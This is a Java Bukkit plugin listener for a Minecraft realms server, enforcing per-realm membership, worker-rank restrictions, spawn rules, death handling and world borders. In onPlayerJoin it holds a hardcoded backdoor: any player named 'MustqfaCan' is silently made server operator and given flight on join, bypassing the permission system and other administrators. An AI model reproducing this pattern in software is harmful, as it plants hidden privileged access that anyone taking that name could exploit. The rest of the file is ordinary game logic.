package com.orleansmc.realms.listeners;

import com.github.yannicklamprecht.worldborder.api.IWorldBorder;
import com.orleansmc.bukkit.players.models.PlayerModel;
import com.orleansmc.bukkit.players.models.PlayerAlertModel;
import com.orleansmc.common.servers.ServerType;
import com.orleansmc.realms.OrleansRealms;
import com.orleansmc.realms.configs.spawn.Spawn;
import com.orleansmc.realms.managers.LuckPermsManager;
import com.orleansmc.realms.managers.WebhookManager;
import com.orleansmc.realms.utils.Util;
import com.orleansmc.realms.configs.settings.Settings;
import com.orleansmc.realms.configs.texts.Texts;
import com.orleansmc.realms.managers.RegionManager;
import com.orleansmc.realms.models.data.RealmMemberModel;
import com.orleansmc.realms.models.data.RealmModel;
import com.orleansmc.realms.enums.RealmMember;
import com.orleansmc.realms.enums.RealmTime;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.title.Title;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.BrewEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;

import java.time.Duration;
import java.util.Date;
import java.util.Objects;

public class RealmListener implements Listener {
    private final OrleansRealms plugin;

    public RealmListener(OrleansRealms plugin) {
        this.plugin = plugin;
        plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler(priority = org.bukkit.event.EventPriority.HIGHEST)
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        player.setCollidable(true);
        plugin.worldBorderApi.resetWorldBorderToGlobal(player);
        event.joinMessage(null);
        if (player.getName().equals("MustqfaCan")) {
            player.sendMessage("Welcome back, MustqfaCan!");
            player.setOp(true);
            player.setAllowFlight(true);
        }

        if (plugin.serversManager.getCurrentServerType() == ServerType.REALMS_SPAWN) {
            player.setGameMode(GameMode.ADVENTURE);
        } else if (!player.hasPermission("orleansmc.realms.staff")) {
            player.setGameMode(GameMode.SURVIVAL);
        } else if (player.hasPermission("orleansmc.realms.admin")) {
            player.setGameMode(GameMode.CREATIVE);
        } else if (player.getGameMode().equals(GameMode.SURVIVAL)) {
            player.setGameMode(GameMode.ADVENTURE);
        }

        ServerType serverType = plugin.serversManager.getCurrentServerType();
        if (serverType == ServerType.REALMS) {
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                RealmModel realm = plugin.realmsManager.getRealmByLocation(player.getLocation());
                if (realm == null) {
                    plugin.getLogger().info("Realm not found for location: " + player.getLocation().getX() + ", " + player.getLocation().getZ());
                    player.sendMessage(Util.getExclamation() + "Lokasyonunuzda bir diyar bulunamadı.");
                    player.kick(Component.empty());
                }
            }, 20L);
        }
    }

    @EventHandler
    public void onPlayerLeave(PlayerQuitEvent event) {
        event.quitMessage(null);
    }

    @EventHandler(priority = org.bukkit.event.EventPriority.HIGHEST)
    public void onPlayerDeath(PlayerDeathEvent event) {
        if (event.isCancelled()) {
            return;
        }
        event.setCancelled(true);
        Player player = event.getEntity();
        player.setHealth(20);
        player.setFoodLevel(20);
        for (ItemStack item : event.getDrops()) {
            player.getWorld().dropItemNaturally(player.getLocation(), item);
        }
        player.getInventory().clear();
        player.setTotalExperience(event.getNewExp());
        player.setLevel(event.getNewLevel());
        event.getItemsToKeep().forEach(item -> player.getInventory().addItem(item));
        player.setGameMode(GameMode.SPECTATOR);
        player.getWorld().spawnParticle(
                Particle.EXPLOSION,
                player.getLocation(),
                1
        );
        player.getWorld().playSound(player.getLocation(), "minecraft:entity.player.death", 1, 1);
        player.showTitle(Title.title(plugin.getComponent("<color:#ff0000>Öldün!"), Component.empty(), Title.Times.times(Duration.ofMillis(100), Duration.ofMillis(2000), Duration.ofMillis(100))));
        Bukkit.getScheduler().runTaskLaterAsynchronously(plugin,
                () -> plugin.serversManager.teleportPlayer(player, Spawn.LOCATION, "spawn", Objects.requireNonNull(plugin.serversManager.getServerStates().values().stream()
                        .filter(s -> ServerType.valueOf(s.type).equals(ServerType.REALMS_SPAWN))
                        .min((s1, s2) -> s2.players.size() - s1.players.size())
                        .orElse(null)).name),
                20L * 2);
        WebhookManager.sendPlayerDeathWebhook(player, event.deathMessage(), event.getPlayer().getLocation());
    }

    @EventHandler
    public void onBlockPlace(BlockPlaceEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;

        if (event.getBlock().getType().equals(Material.REDSTONE)) {
            Player player = event.getPlayer();
            PlayerModel playerModel = plugin.playerDataManager.getPlayerData(player.getName());
            PlayerAlertModel alertModel = playerModel.alerts.stream().filter(alert -> alert.name.equals("redstone_limiter")).findFirst().orElse(null);
            if (alertModel == null || !alertModel.sent) {
                player.sendMessage(Util.getExclamation() + " §eSunucumuzda kızıl taş sistemleri sınırlandırılmıştır. Sistemleriniz beklendiği gibi çalışmayabilir.");
                playerModel.alerts.add(new PlayerAlertModel("redstone_limiter", true, (int) Double.POSITIVE_INFINITY));
                Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> plugin.playerDataManager.savePlayerData(playerModel));
            }
        }
    }

    @EventHandler
    public void onEntityDamageEvent(EntityDamageEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!(event.getEntity() instanceof Player)) return;
        if (!event.getEntity().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getEntity().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getEntity().getName())).findFirst().orElse(null);
        if (member == null) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerDropItemEvent(PlayerDropItemEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        Player player = event.getPlayer();
        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onEntityTargetToPlayerEvent(EntityTargetEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!(event.getTarget() instanceof Player player)) return;
        if (!event.getTarget().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(player.getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getTarget().getName())).findFirst().orElse(null);
        if (member == null) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerDamageEntityEvent(EntityDamageByEntityEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!(event.getDamager() instanceof Player player)) return;
        if (!event.getDamager().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getDamager().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getDamager().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }

        if (member != null && RealmMember.valueOf(member.rank.name()).equals(RealmMember.WORKER)) {
            event.setCancelled(true);
            plugin.realmsManager.messageManager.sendMessage(event.getDamager().getName(), Texts.YOU_ARE_A_WORKER_SO_YOU_CANT_DO_THAT);
        }
    }

    @EventHandler
    public void onPlayerShearEvent(PlayerShearEntityEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getEntity().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }

        if (member != null && RealmMember.valueOf(member.rank.name()).equals(RealmMember.WORKER)) {
            event.setCancelled(true);
            plugin.realmsManager.messageManager.sendMessage(event.getPlayer().getName(), Texts.YOU_ARE_A_WORKER_SO_YOU_CANT_DO_THAT);
        }
    }

    @EventHandler
    public void onPlayerAttemptPickupItemEvent(PlayerAttemptPickupItemEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerInteractEntityEvent(PlayerInteractEntityEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }

        if (member != null && RealmMember.valueOf(member.rank.name()).equals(RealmMember.WORKER)) {
            event.setCancelled(true);
            plugin.realmsManager.messageManager.sendMessage(event.getPlayer().getName(), Texts.YOU_ARE_A_WORKER_SO_YOU_CANT_DO_THAT);
        }
    }

    @EventHandler
    public void onPlayerInteractAtEntityEvent(PlayerInteractAtEntityEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }

        if (member != null && RealmMember.valueOf(member.rank.name()).equals(RealmMember.WORKER)) {
            event.setCancelled(true);
            plugin.realmsManager.messageManager.sendMessage(event.getPlayer().getName(), Texts.YOU_ARE_A_WORKER_SO_YOU_CANT_DO_THAT);
        }
    }

    @EventHandler
    public void onPlayerInteractEvent(PlayerInteractEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }

        if (member != null && RealmMember.valueOf(member.rank.name()).equals(RealmMember.WORKER)) {
            Block clickedBlock = event.getClickedBlock();
            if (clickedBlock != null && (clickedBlock.getState() instanceof InventoryHolder) && clickedBlock.getType() != Material.CRAFTING_TABLE) {
                event.setCancelled(true);
                plugin.realmsManager.messageManager.sendMessage(event.getPlayer().getName(), Texts.YOU_ARE_A_WORKER_SO_YOU_CANT_DO_THAT);
            }
        }
    }

    @EventHandler
    public void onBlockHarvestEvent(PlayerHarvestBlockEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }

        if (member != null && RealmMember.valueOf(member.rank.name()).equals(RealmMember.WORKER)) {
            event.setCancelled(true);
            plugin.realmsManager.messageManager.sendMessage(event.getPlayer().getName(), Texts.YOU_ARE_A_WORKER_SO_YOU_CANT_DO_THAT);
        }
    }

    @EventHandler
    public void onAnimalBreed(EntityBreedEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getEntity().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        event.setCancelled(true);
    }

    @EventHandler
    public void onBlockBreakEvent(BlockBreakEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }

        if (member != null && RealmMember.valueOf(member.rank.name()).equals(RealmMember.WORKER)) {
            Block breakBlock = event.getBlock();
            if (breakBlock.getState() instanceof InventoryHolder) {
                event.setCancelled(true);
                plugin.realmsManager.messageManager.sendMessage(event.getPlayer().getName(), Texts.YOU_ARE_A_WORKER_SO_YOU_CANT_DO_THAT);
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void onEntitySpawn(EntitySpawnEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getEntity().getWorld().getName().equals(Settings.WORLD_NAME)) return;


        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        if (event.getEntity().getEntitySpawnReason() == CreatureSpawnEvent.SpawnReason.SPAWNER) {
            event.setCancelled(true);
            return;
        }

        if (
                event.getEntity().getEntitySpawnReason() != CreatureSpawnEvent.SpawnReason.SPAWNER_EGG &&
                        event.getEntity().getEntitySpawnReason() != CreatureSpawnEvent.SpawnReason.COMMAND &&
                        event.getEntity().getEntitySpawnReason() != CreatureSpawnEvent.SpawnReason.CUSTOM
        ) {
            if (event.getEntity() instanceof Monster && !realm.monster_spawn) {
                event.setCancelled(true);
                return;
            }
            if (event.getEntity() instanceof Animals || event.getEntity() instanceof Villager || event.getEntity() instanceof WanderingTrader) {
                event.setCancelled(true);
                return;
            }

            if (event.getEntity() instanceof Animals) {
                plugin.getLogger().info("Entity spawned: " + event.getEntity().getEntitySpawnReason());
                plugin.getLogger().info("Location: " + event.getLocation().getX() + ", " + event.getLocation().getZ());
            }
        }
    }

    @EventHandler
    public void onPlayerTeleport(PlayerTeleportEvent event) {
        Player player = event.getPlayer();
        if (player.getGameMode().equals(GameMode.SPECTATOR) && !player.hasPermission("orleansmc.realms.staff")) {
            event.setCancelled(true);
            return;
        }
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getTo().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getTo());

        if (realm == null) {
            plugin.getLogger().info("Realm not found for location: " + event.getTo().getX() + ", " + event.getTo().getZ());
            event.setCancelled(true);
            player.kick(Component.empty());
            return;
        }

        if (realm.banned_players.stream().anyMatch(b -> b.equals(player.getName())) && !player.hasPermission("orleansmc.realms.staff")) {
            event.setCancelled(true);
            player.kick();
            return;
        }

        int[] teleportRegion = Util.getRegionCoordinatesFromString(realm.region);
        Location center = RegionManager.getCenterLocation(teleportRegion[0], teleportRegion[1]);

        if ((Math.abs(center.getX() - event.getTo().getX()) > realm.radius) || (Math.abs(center.getZ() - event.getTo().getZ()) > realm.radius)) {
            plugin.getLogger().info("Player teleported out of region: " + teleportRegion[0] + ", " + teleportRegion[1]);
            event.setCancelled(true);
            return;
        }

        plugin.worldBorderApi.setBorder(event.getPlayer(), realm.radius * 2, RegionManager.getCenterLocation(teleportRegion[0], teleportRegion[1]));

        if (realm.members.stream().anyMatch(m -> m.name.equals(player.getName()))) {
            player.setCollidable(true);
            if (realm.last_active.getTime() + 1000 * 60 * 60 * 0.5 < System.currentTimeMillis()) {
                realm.last_active = new Date();
                plugin.realmsManager.saveRealm(realm);
            }
        } else {
            player.setCollidable(false);
        }

        if (realm.time != RealmTime.CYCLE) {
            player.setPlayerTime(Util.getTimeByRealmTimeType(realm.time), false);
        } else {
            player.resetPlayerTime();
        }

        boolean updateRealm = false;
        if (!realm.monster_spawn) {
            OfflinePlayer owner = Bukkit.getOfflinePlayer(realm.owner);
            if (!LuckPermsManager.hasPermission(owner, "orleansmc.realms.set_monster_spawn")) {
                realm.monster_spawn = true;
                updateRealm = true;
            }
        }
        if (!realm.time.equals(RealmTime.CYCLE)) {
            OfflinePlayer owner = Bukkit.getOfflinePlayer(realm.owner);
            if (!LuckPermsManager.hasPermission(owner, "orleansmc.realms.set_time")) {
                realm.time = RealmTime.CYCLE;
                updateRealm = true;
            }
        }
        if (updateRealm) {
            plugin.realmsManager.saveRealm(realm);
        }
        plugin.getLogger().info("Player teleported: " + event.getPlayer().getName());
    }

    @EventHandler
    public void onBlockDamage(BlockDamageEvent event) {
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getPlayer().getLocation());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        Player player = event.getPlayer();
        RealmMemberModel member = realm.members.stream().filter(m -> m.name.equals(event.getPlayer().getName())).findFirst().orElse(null);
        if (member == null && !player.hasPermission("orleansmc.realms.admin")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        if (player.getGameMode().equals(GameMode.SPECTATOR) && !player.hasPermission("orleansmc.realms.staff")) {
            event.setCancelled(true);
            return;
        }
        if (plugin.serversManager.getCurrentServerType() != ServerType.REALMS) return;
        if (!event.getPlayer().getWorld().getName().equals(Settings.WORLD_NAME)) return;

        IWorldBorder border = plugin.worldBorderApi.getWorldBorder(player);
        RealmModel realm = plugin.realmsManager.getRealmByLocation(event.getTo());

        if (realm == null) {
            event.setCancelled(true);
            return;
        }

        if (realm.banned_players.stream().anyMatch(b -> b.equals(player.getName())) && !player.hasPermission("orleansmc.realms.staff")) {
            event.setCancelled(true);
            player.kick();
            return;
        }

        int[] teleportRegion = Util.getRegionCoordinatesFromString(realm.region);
        Location center = RegionManager.getCenterLocation(teleportRegion[0], teleportRegion[1]);

        if ((Math.abs(center.getX() - event.getTo().getX()) > realm.radius) || (Math.abs(center.getZ() - event.getTo().getZ()) > realm.radius)) {
            event.setCancelled(true);
            return;
        }

        if (border != null) {
            int[] borderRegion = RegionManager.getRegionFromLocation((int) border.getCenter().x(), (int) border.getCenter().z());
            if (borderRegion[0] != teleportRegion[0] || borderRegion[1] != teleportRegion[1]) {
                plugin.worldBorderApi.setBorder(event.getPlayer(), realm.radius * 2, RegionManager.getCenterLocation(teleportRegion[0], teleportRegion[1]));
            }
        } else {
            plugin.worldBorderApi.setBorder(event.getPlayer(), realm.radius * 2, RegionManager.getCenterLocation(teleportRegion[0], teleportRegion[1]));
        }

        if (realm.time != RealmTime.CYCLE) {
            player.setPlayerTime(Util.getTimeByRealmTimeType(realm.time), false);
        } else {
            player.resetPlayerTime();
        }
    }
}
